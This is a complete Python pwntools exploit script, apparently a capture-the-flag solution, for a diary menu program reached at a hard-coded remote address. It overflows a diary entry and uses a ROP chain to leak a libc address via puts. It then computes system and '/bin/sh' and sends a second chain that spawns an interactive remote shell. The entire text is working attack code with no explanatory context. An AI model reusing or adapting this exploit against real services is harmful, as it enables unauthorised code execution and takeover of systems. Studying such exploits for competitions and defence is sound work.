from pwn import *
REMOTE = True
if REMOTE:
    HOST, PORT = '54.180.153.92', 50001
else:
    HOST, PORT = 'localhost', 50001 

io = remote(HOST, PORT)
#io = process('../challenge/main')
elf = ELF('../challenge/main')
libc = elf.libc
pop_rdi_ret = 0x401236
pop_rsi_ret = 0x401238

def add_diary(page, name, content):
    io.sendlineafter('> ', '1')
    io.sendlineafter('page > ', str(page))
    io.sendlineafter('name > ', name)
    io.sendlineafter('content > ', content)

def edit_diary(page, name, content):
    io.sendlineafter('> ', '2')
    io.sendlineafter('page > ', str(page))
    io.sendlineafter('name > ', name)
    io.sendlineafter('content > ', content)

def delete_diary(page):
    io.sendlineafter('> ', '3')
    io.sendlineafter('page > ', str(page))

def print_diary():
    io.sendlineafter('> ', '4')
payload = b"a"*0x14c
payload += p64(pop_rdi_ret)
payload += p64(elf.got['setvbuf'])
payload += p64(elf.plt['puts'])
payload += p64(0x401846)
add_diary(15, "a"*8, "b"*8)
edit_diary(15, "a"*8, payload)

io.sendlineafter('> ', '5')
libc_base = u64(io.recv(6) + b'\x00\x00') - libc.symbols['setvbuf']
system = libc_base + libc.symbols['system'] 
binsh = libc_base + next(libc.search(b'/bin/sh'))
io.success(f'libc_base @ {hex(libc_base)}')

payload = b"a"*0x14c
payload += p64(pop_rdi_ret+1)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)
add_diary(15, "a"*8, "b"*8)
edit_diary(15, "a"*8, payload)
io.sendlineafter('> ', '5')
io.interactive()
